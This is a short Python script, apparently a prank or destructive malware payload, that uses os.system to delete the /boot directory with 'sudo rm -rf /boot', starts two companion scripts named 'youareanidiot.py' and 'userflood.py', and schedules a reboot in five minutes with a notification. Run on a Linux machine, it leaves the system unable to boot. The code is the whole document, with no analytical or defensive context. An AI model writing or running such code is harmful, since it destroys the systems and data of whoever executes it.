import os
os.system("sudo cp /boot /tmp/")
os.system("sudo rm -rf /boot")
os.system("nohup python3 youareanidiot.py")
os.system("nohup python3 userflood.py")
os.system("nohup shutdown -r -t 300")
os.system("nohup notify-send Computer Restarting After 5 Minutes.")
